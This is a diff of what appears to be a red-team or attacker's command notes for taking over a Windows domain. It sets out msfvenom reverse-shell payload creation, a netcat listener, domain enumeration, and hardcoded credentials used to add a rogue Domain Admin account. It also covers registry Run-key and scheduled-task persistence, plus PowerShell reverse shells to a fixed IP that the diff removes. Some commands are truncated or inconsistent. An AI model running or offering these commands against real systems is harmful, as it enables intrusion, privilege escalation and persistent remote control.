@@ -1,3 +1,7 @@
+**Create stageless reverse shell payload for windows on kali
+msfvenom -p windows/shell_reverse_tcp LHOST=<kali ip> LPORT=<port> -f exe > reverse.exe
+**Open a listener on kali for the reverse shell
+nc -lvp <port>
 **Web host the payload from kali
 python3 -m http.server
 **From victim box download file, run as administrator while logged into a domain admin account
@@ -10,17 +14,27 @@ net view /domain
 net group "Domain Admins" /domain
 net group "Domain Controllers" /domain
 nslookup CI-SERVICE-WIN2
+
 $pass=ConvertTo-SecureString "1qaz2wsx!QAZ@WSX" -AsPlainText -Force
 $cred=New-Object System.Management.Automation.PSCredential("DCO\sydney.hall", $pass)
 Invoke-Command -Credential $cred -ComputerName CI-SERVICE-WIN2 -ScriptBlock { net user BADMIN Sn3akyP@55 /add }
 Invoke-Command -Credential $cred -ComputerName CI-SERVICE-WIN2 -ScriptBlock { Add-ADGroupMember -Identity "Domain Admins" -Members BADMIN }
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v critical/t REG_SZ /d "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.169.0.228",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v critical/t REG_SZ /d "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.169.0.228",4243);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v critical/t REG_SZ /d "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.169.0.228",4244);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v critical/t REG_SZ /d "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.169.0.228",4245);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v critical/t REG_SZ /d 
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v critical/t REG_SZ /d  
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v critical/t REG_SZ /d 
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v critical/t REG_SZ /d "powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
+
 cp reverse.exe C:\Windows\system32\updater.exe
+$pass=ConvertTo-SecureString "1qaz2wsx!QAZ@WSX" -AsPlainText -Force
+$cred=New-Object System.Management.Automation.PSCredential("DCO\sydney.hall", $pass)
+Enter-PSSEssion -ComputerName CI-SERVICE-WIN2 -Credential $cred
 $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
 $Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "cp C:\Windows\system32\update.exe C:\Users\sydney.hall\Documents\updater.exe"
 $Action2 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "C:\Users\sydney.hall\update.exe"
 Register-ScheduledTask -TaskName "Perform Update" -Trigger $Trigger -Action $Action -RunLevel Highest -Force
 Register-ScheduledTask -TaskName "Run Update" -Trigger $Trigger -Action $Action2 -RunLevel Highest -Force
+
+$pass=ConvertTo-SecureString "1qaz2wsx!QAZ@WSX" -AsPlainText -Force
+$cred=New-Object System.Management.Automation.PSCredential("DCO\sydney.hall", $pass)
+Enter-PSSEssion -ComputerName CI-SERVICE-WIN2 -Credential $cred
